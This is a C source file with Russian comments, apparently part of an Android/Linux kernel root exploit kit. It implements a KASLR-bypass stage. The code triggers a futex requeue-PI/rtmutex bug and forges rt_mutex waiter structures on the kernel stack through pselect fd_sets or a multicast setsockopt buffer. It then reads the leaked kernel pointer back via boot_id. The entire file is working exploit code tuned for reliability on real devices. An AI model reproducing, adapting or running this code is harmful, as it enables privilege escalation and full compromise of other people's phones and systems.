#include "common.h"

#include <netinet/in.h>

#define SLIDE_MAX_ATTEMPTS 20

/* Адаптивное ожидание: короткий прогрев — затем сон; ядро не жжётся. */
static inline void slide_spin_wait(int iter) {
  if (iter < 200) {
    for (int i = 0; i < 64; i++) {
      __asm__ volatile("yield" ::: "memory");
    }
  } else {
    struct timespec ts = {.tv_sec = 0, .tv_nsec = 200000};
    nanosleep(&ts, NULL);
  }
}
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
/* Сдвиг waiter-слов слайда (per-target, см. WAITER_* в target.h) */
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT WAITER_WORD_SHIFT
#endif
/* Рантайм-ручка: RMV_SLIDE_SHIFT=N перекрывает сдвиг без пересборки */
static int slide_word_shift(void) {
  static int v = -1;
  if (v < 0) {
    v = WAITER_WORD_SHIFT;
    const char *env = getenv("RMV_SLIDE_SHIFT");
    if (env && *env) {
      int n = atoi(env);
      if (n >= -14 && n <= 14) v = n;
    }
  }
  return v;
}
#define SLIDE_WAIT_SECONDS 2

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_word_shift() + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words_nested[] = {
    /* Формы и RED-бит — по размеченной таблице ghostlock-x200-root 1.3.5
     * (устройство-верифицировано на b57): words[0] нечётный (RB_RED) —
     * иначе rb_erase на дрейфе берёт ____rb_erase_color на мусорном дереве
     * (watchdog-panic); слова 4/12/13/14 = fake_lock (нулевая страница) —
     * при дрейфе на ±1..+4 слов chain-walk читает lock там и обязан видеть
     * unlocked+пустое дерево, а не 0/мусор (trylock(мусор)=data abort). */
    {0, SLIDE_LOGGERS_0_1 | 1, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {4, fake_lock, "tree_deadline"},
    {5, SLIDE_LOGGERS_0_1 | 1, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, SLIDE_INIT_TASK, "task"},
    {11, fake_lock, "lock"},
    {12, fake_lock, "wake_state"},
    {13, fake_lock, "ww_ctx"},
    {14, fake_lock, "pad14"},
  };
  /* Компактный waiter (5.10/6.1): tree@+0..2, pi@+3..5, task@+6, lock@+7,
   * prio@+8, deadline@+9 — значения те же (логгер/boot_id в узлы дерева,
   * init_task/fake_lock в task/lock). */
  struct slide_waiter_word words_compact[] = {
    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, SLIDE_LOGGERS_0_1, "pi_parent"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {6, SLIDE_INIT_TASK, "task"},
    {7, fake_lock, "lock"},
    {8, FAKE_WAITER_PRIO, "prio"},
    {9, 0, "deadline"},
  };
  struct slide_waiter_word *words = WAITER_COMPACT ? words_compact : words_nested;
  size_t words_n = WAITER_COMPACT
      ? sizeof(words_compact) / sizeof(words_compact[0])
      : sizeof(words_nested) / sizeof(words_nested[0]);
  for (size_t i = 0; i < words_n; i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  /* Размечено в ghostlock-x200-root 1.3.5:
   * 1) dup2 ВСЕ fd 0..NFDS-1 (а не только выставленные биты): число
   *    dup2-вызовов фиксировано -> тайминг входа в pselect фиксирован ->
   *    окно chain-walk не дрейфует от содержимого words[0]; заодно любой
   *    бит в bitmap-словах (а это указатели) гарантированно валиден.
   * 2) fd 0/1/2 при этом покрываются — перепривязываем stdout/stderr на
   *    сохранённый лог-fd, чтобы логи попыток не терялись.
   * 3) filler fd >= NFDS+8 обязателен: core_sys_select берёт
   *    n = min(nfds, fdtable->max_fds); при max_fds < NFDS размер fdset
   *    в стеке ядра уменьшается и окно наложения съезжает (мисс). */
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    dup2(read_fd, fd);
  }
  if (rmv_log_fd >= 0) {
    dup2(rmv_log_fd, STDOUT_FILENO);
    dup2(rmv_log_fd, STDERR_FILENO);
  }
  int filler = fcntl(read_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 8);
  pr_info("slide filler_fd=%d errno=%d (max_fds >= %d)\n", filler, errno,
          SLIDE_PSELECT_NFDS + 8);
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  /* Писатель (поток pselect) уходит на старшее ядро: CPU0 занят perf
   * sampling'ом и общим шумом, CPU1 — консьюмер. Разнесение писателя и
   * консьюмера на разные кластеры стабилизирует окно наложения
   * (размечено в ghostlock-x200-root: pin_to_core(7)). */
  long ncpu = sysconf(_SC_NPROCESSORS_CONF);
  if (ncpu > 7) {
    pin_to_core(7);
  } else if (ncpu > 2) {
    pin_to_core((int)ncpu - 1);
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

#ifdef MCAST_WAITER_OFF
/* ── MCAST-носитель (см. common.h) ─────────────────────────────────────
 * Байт-карта waiter (relative к началу waiter'а) — устройство-верифицирована
 * ghostlock-kit на семействе android14-6.1: tree pc@+0/r@+8/left@+0x10,
 * pi_tree pc@+0x18/r@+0x20/left@+0x28, task@+0x30, lock@+0x38,
 * wake_state u32@+0x40, prio u32@+0x44, deadline@+0x48, ww_ctx@+0x50. */
void mcast_put_waiter(unsigned char *buf, uint64_t tree_pc, uint64_t tree_left,
                      uint64_t pi_pc, uint64_t pi_left, uint64_t task,
                      uint64_t lock, uint32_t wake, uint32_t prio) {
  memset(buf, 0, MCAST_BUF_LEN);
  put64(buf, MCAST_WAITER_OFF + 0x00, tree_pc);
  put64(buf, MCAST_WAITER_OFF + 0x10, tree_left);
  put64(buf, MCAST_WAITER_OFF + 0x18, pi_pc);
  put64(buf, MCAST_WAITER_OFF + 0x28, pi_left);
  put64(buf, MCAST_WAITER_OFF + 0x30, task);
  put64(buf, MCAST_WAITER_OFF + 0x38, lock);
  put32(buf, MCAST_WAITER_OFF + 0x40, wake);
  put32(buf, MCAST_WAITER_OFF + 0x44, prio);
  /* buf[8]=0 (gsr_group.ss_family): сверка семьи в do_ip_setsockopt
   * выходит сразу ПОСЛЕ 0x108-копии с -EADDRNOTAVAIL. */
}

int mcast_open_sock(void) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    pr_error("mcast socket errno=%d\n", errno);
  }
  return fd;
}

/* Ожидаемое -1/EADDRNOTAVAIL(99): копия в кадр состоялась, сверка ушла
 * на ранний выход. Другой errno = MCAST-ветки нет (CONFIG_IP_MULTICAST?)
 * — транспорт мёртв, сообщаем честно. */
int mcast_poison(int fd, const unsigned char *buf) {
  errno = 0;
  (void)setsockopt(fd, SOL_IP, MCAST_JOIN_SOURCE_GROUP, buf, MCAST_BUF_LEN);
  return errno;
}

static atomic_int slide_mcast_pulse_done;

void *slide_mcast_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  int idle = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      slide_spin_wait(idle++);
      continue;
    }
    idle = 0;
    seen = seq;
    if (MCAST_CONSUME_DELAY_USEC > 0) {
      usleep(MCAST_CONSUME_DELAY_USEC);
    }
    if (atomic_load(&slide_consume_go) != seq) {
      continue;
    }
    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_mcast_pulse_done, 1);
  }
}

void slide_mcast_stack_copy(void) {
  if (!page_base || !fake_lock) {
    pr_error("slide mcast missing kernel page base=%016zx lock=%016zx\n",
             page_base, fake_lock);
    return;
  }

  long ncpu = sysconf(_SC_NPROCESSORS_CONF);
  if (ncpu > 7) {
    pin_to_core(7);
  } else if (ncpu > 2) {
    pin_to_core((int)ncpu - 1);
  }

  int fd = mcast_open_sock();
  if (fd < 0) {
    return;
  }
  unsigned char buf[MCAST_BUF_LEN];
  /* Форма слайда: loggers в pc обоих деревьев (RED-бит — чтобы rb_erase
   * шёл прямой relink-путь без color-walk), boot_id-страница в left,
   * init_task в task (PI-обход читает его pi_lock — безопасный чтению),
   * fake_lock в lock. Значения = p0-алиасы тех же символов, что у
   * pselect-слайда; readback стирает бит 0 (slide_read_stext). */
  mcast_put_waiter(buf, SLIDE_LOGGERS_0_1 | 1, SLIDE_RANDOM_BOOT_ID_DATA,
                   SLIDE_LOGGERS_0_1 | 1, SLIDE_RANDOM_BOOT_ID_DATA,
                   SLIDE_INIT_TASK, fake_lock, 3, MCAST_WAITER_PRIO);
  int gap = env_int_range("RMV_MCAST_GAP_USEC", MCAST_ATTEMPT_GAP_USEC, 0, 5000);
  int hit_attempt = 0;
  int last_errno = 0;
  for (int attempt = 1; attempt <= MCAST_ROUTE_ATTEMPTS; attempt++) {
    atomic_store(&slide_mcast_pulse_done, 0);
    atomic_store(&slide_consume_go, attempt);
    last_errno = mcast_poison(fd, buf);
    if (last_errno != EADDRNOTAVAIL) {
      pr_error("slide mcast attempt=%d errno=%d — транспорта нет "
               "(CONFIG_IP_MULTICAST? IPv4?), стоп\n", attempt, last_errno);
      atomic_store(&slide_consume_go, 0);
      break;
    }
    int spins = 0;
    while (!atomic_load(&slide_mcast_pulse_done)) {
      slide_spin_wait(spins++);
      if (spins > 20000) {
        pr_warning("slide mcast attempt=%d: pulse timeout\n", attempt);
        break;
      }
    }
    atomic_store(&slide_consume_go, 0);
    if (gap > 0) {
      usleep((useconds_t)gap);
    }
    if ((attempt & 7) == 0) {
      uint64_t stext = slide_read_stext();
      if (stext) {
        hit_attempt = attempt;
        break;
      }
    }
  }
  pr_info("slide mcast route done hit=%d calls=%d last_errno=%d\n",
          hit_attempt, atomic_load(&slide_consume_calls), last_errno);
  close(fd);
}
#endif /* MCAST_WAITER_OFF */

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  int idle_iters = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      slide_spin_wait(idle_iters++);
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }
    idle_iters = 0;

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    int exit_iters = 0;
    while (atomic_load(&slide_consume_go)) {
      slide_spin_wait(exit_iters++);
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

#ifdef MCAST_WAITER_OFF
  slide_mcast_stack_copy();
#else
  slide_pselect_stack_copy();
#endif
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  /* boot_id — 16 байт. ОСНОВНОЕ окно (байты 0..7) — то, которое заведомо
   * держит указатель nfulnl_logger (words[0] формы). Проверяем его первым
   * и требуем строгий sanity: канонический kernel-адрес И выведенный stext
   * попадает в диапазон kernel text и выровнен на KASLR-гранулу.
   *
   * ВАЖНО (исправление регрессии): раньше принять «любой канонический
   * указатель среди 16 окон, чей stext кратен 2 МБ» было НЕДОСТАТОЧНО —
   * выравнивание отсеивает лишь 1/64, и при 9 окнах в ~14% прогонов
   * выбиралось ЧУЖОЕ окно. Неверный stext = неверные canon-адреса всех
   * последующих записей = data abort/паника ядра. Отсюда «эксплойт почти
   * всегда крашит». Теперь fallback-окна допускаются только с полной
   * проверкой диапазона, а основное окно имеет приоритет. */
  uint64_t candidates[16];
  int cand_window[16];
  int ncand = 0;
  for (int w = 0; w + 1 < 16; w += 1) {
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) {
      v |= (uint64_t)raw[w + i] << (i * 8);
    }
    if ((v >> 48) == 0xffffULL) {
      cand_window[ncand] = w;
      candidates[ncand++] = v;
    }
  }
  if (ncand == 0) {
    /* полный дрейф: печать всех 16 байт для диагностики с телефона */
    pr_warning("slide bad leaked pointer=no window (raw=");
    for (int i = 0; i < 16; i++) {
      printf("%02x", raw[i]);
    }
    printf(")\n");
    return 0;
  }

  /* Строгая проверка кандидата: stext = KIMAGE_TEXT_BASE + slide
   * (канонический base kernel text), диапазон — относительно
   * KIMAGE_TEXT_BASE (±4 ГБ, покрывает любой KASLR slide), плюс
   * выравнивание на 2 МБ (SECTION_SIZE; slide кратен 2 МБ, base
   * выровнен — валидный stext проходит всегда).
   *
   * ВАЖНО (исправление регрессии 7a4cb97): раньше диапазоном был
   * [0xffffff8000000000, 0xffffff9000000000) — это LINEAR MAP (heap),
   * а не kernel text. Валидный stext 0xffffffc0... туда НЕ попадал и
   * отвергался → slide всегда фейлился → пейлоад ломался на всех
   * таргетах. Канонический text base лежит на ~252 ГБ выше linear map. */
  uint64_t stext = 0;
  uint64_t leaked = 0;
  int used_window = -1;
  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  /* Проход 1: только основное окно (w == 0) — не рискуем чужими. */
  for (int i = 0; i < ncand; i++) {
    if (cand_window[i] != 0) {
      continue;
    }
    uint64_t v = candidates[i] & ~1ULL; /* RB_RED бит words[0] */
    uint64_t cand_stext = v - off;
    if (cand_stext >= KIMAGE_TEXT_BASE - 0x100000000ULL &&
        cand_stext < KIMAGE_TEXT_BASE + 0x100000000ULL &&
        (cand_stext & 0x3fffffULL) == 0) {
      stext = cand_stext;
      leaked = v;
      used_window = 0;
      break;
    }
    /* основное окно каноническое, но sanity провален — это уже признак
     * дрейфа; логируем, но не принимаем вслепую */
    pr_warning("slide primary window failed sanity stext=%016llx\n",
               (unsigned long long)cand_stext);
  }
  /* Проход 2: прочие окна — только со строгой проверкой диапазона. */
  if (!stext) {
    for (int i = 0; i < ncand; i++) {
      if (cand_window[i] == 0) {
        continue;
      }
      uint64_t v = candidates[i] & ~1ULL;
      uint64_t cand_stext = v - off;
      if (cand_stext >= KIMAGE_TEXT_BASE - 0x100000000ULL &&
          cand_stext < KIMAGE_TEXT_BASE + 0x100000000ULL &&
          (cand_stext & 0x3fffffULL) == 0) {
        stext = cand_stext;
        leaked = v;
        used_window = cand_window[i];
        pr_warning("slide fallback boot_id window=%d accepted\n", used_window);
        break;
      }
    }
  }
  if (!stext) {
    /* ни одно окно не прошло строгую проверку — честный лог */
    pr_warning("slide bad leaked pointer candidates=%d:", ncand);
    for (int i = 0; i < ncand; i++) {
      printf(" w%d=%016llx", cand_window[i], (unsigned long long)candidates[i]);
    }
    printf("\n");
    return 0;
  }

  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx window=%d stext=%016llx\n",
             getpid(), (unsigned long long)leaked, used_window,
             (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
#ifdef MCAST_WAITER_OFF
  SYSCHK(pthread_create(&consumer, NULL, slide_mcast_consumer_thread, NULL));
#else
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
#endif

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);

  /* Same fast-wake as run_main_route_threads(): the requeue dies with
   * -EDEADLK (PI cycle), leaving the slide waiter's pi_blocked_on dangling
   * into its own kernel stack frame (rtmutex remove_waiter() bug). Wake it so
   * the pselect route starts immediately; handle_early_requeue_pi_wakeup()
   * does not touch pi_blocked_on. */
  errno = 0;
  futex_op(&slide_f_wait, FUTEX_WAKE, 1, NULL, NULL, 0);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      /* Раньше этот путь молчал: после полного мисса спрей оставляет
       * мусор в слэбе, prepare часто падает здесь, и попытка 2/3
       * «фейлилась сразу без логов». Теперь логируем честно. */
      pr_warning("slide attempt %d: kernel page prep failed base=%016zx lock=%016zx\n",
                 attempt, page_base, fake_lock);
      continue;
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
